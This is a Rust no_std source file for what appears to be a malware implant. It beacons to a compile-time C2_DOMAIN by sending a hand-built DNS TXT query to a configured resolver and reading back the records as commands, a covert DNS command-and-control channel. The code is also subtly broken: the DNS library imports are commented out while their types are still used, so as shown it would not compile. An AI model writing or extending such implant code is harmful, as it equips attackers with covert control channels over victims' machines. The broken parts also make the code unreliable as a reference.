#![no_std]
#![no_main]
extern crate alloc;

mod socket;

#[cfg(debug_assertions)]
mod hex;

#[cfg(debug_assertions)]
mod debug;

#[cfg(debug_assertions)]
pub use debug::print;

use talc::{*, source::Claim};
use alloc::vec::Vec;
// use simple_dns::{Packet, PacketFlag, Question, CLASS, TYPE};
// use simple_dns::rdata::RData;


const C2_DOMAIN: &str = env!("C2_DOMAIN");

struct Lcg {
    seed: u32,
    multiplier: u32, // a
    increment: u32, // c
}

impl Lcg {
    fn new(seed: u32, multiplier: u32, increment: u32) -> Self {
        Self { seed, multiplier, increment }
    }
    fn next_u16(&mut self) -> u16 {
        self.seed = self.seed.wrapping_mul(self.multiplier).wrapping_add(self.increment);
        (self.seed >> 16) as u16
    }
}

const fn parse_u8(s: &str) -> u8 {
    let b = s.as_bytes();
    let mut i = 0;
    let mut n: u16 = 0;
    while i < b.len() {
        n = n * 10 + (b[i] - b'0') as u16;
        i += 1;
    }
    n as u8
}

macro_rules! env_u8 {
    ($name:expr) => { parse_u8(env!($name)) };
}

const DNS_SERVER: [u8; 4] = [env_u8!("DNS_1"), env_u8!("DNS_2"), env_u8!("DNS_3"), env_u8!("DNS_4")];
    
#[global_allocator]
static TALC: TalcLock<spinning_top::RawSpinlock, Claim> = TalcLock::new(unsafe {
    static mut INITIAL_HEAP: [u8; min_first_heap_size::<DefaultBinning>() + 2000] =
        [0; min_first_heap_size::<DefaultBinning>() + 2000];
    Claim::array(&raw mut INITIAL_HEAP)
});

pub struct Resolver {
    server: [u8; 4],
}

impl Resolver {
    pub const fn new(server: [u8; 4]) -> Self {
        Self { server }
    }

    pub fn query_txt(&self, name: &str, tx_id: u16) -> Option<Vec<Vec<u8>>> {
        let mut packet = Packet::new_query(tx_id);
        packet.set_flags(PacketFlag::RECURSION_DESIRED);
        packet.questions.push(
            Question::new(
                name.try_into().ok()?,
                TYPE::TXT.into(),
                CLASS::IN.into(),
                false,
            )
        );
        let query_bytes = packet.build_bytes_vec().ok()?;

        let mut resp_buf = [0u8; 4096];
        
        #[cfg(debug_assertions)]
        println!("Sending query with id {}", tx_id);

        let rlen = socket::udp_query(
            self.server,
            53,
            &query_bytes,
            &mut resp_buf,
            5,
        )?;

        let response = Packet::parse(&resp_buf[..rlen]).ok()?;
        let mut results = Vec::new();

        for answer in response.answers {
            match answer.rdata {
                RData::TXT(txt) => {
                    let mut data = Vec::new();
                    for (key, value) in txt.iter_raw() {
                        data.extend_from_slice(key);
                        if let Some(value) = value {
                            data.extend_from_slice(value);
                        }
                    }
                    results.push(data);
                }
                _ => {}
            }
        }

        if results.is_empty() { None } else { Some(results) }
    }
}

#[unsafe(no_mangle)]
extern "C" fn main() -> i32 {
    let mut seed: u32 = 0;
    unsafe { core::arch::x86_64::_rdrand32_step(&mut seed) };
    let mut lcg = Lcg::new(seed, 1664525, 1013904223); // https://en.wikipedia.org/wiki/Linear_congruential_generator

    let resolver = Resolver::new(DNS_SERVER);
    if let Some(txt_records) = resolver.query_txt(C2_DOMAIN, lcg.next_u16()) {
        for txt in &txt_records {
            match core::str::from_utf8(txt) {
                Ok(s)  => { #[cfg(debug_assertions)] println!("Recieved: {}", s); },
                Err(_) => { #[cfg(debug_assertions)] println!("(invalid utf8)"); },
            }
        }
    } else {
        #[cfg(debug_assertions)]
        println!("no records returned");
    }
    0
}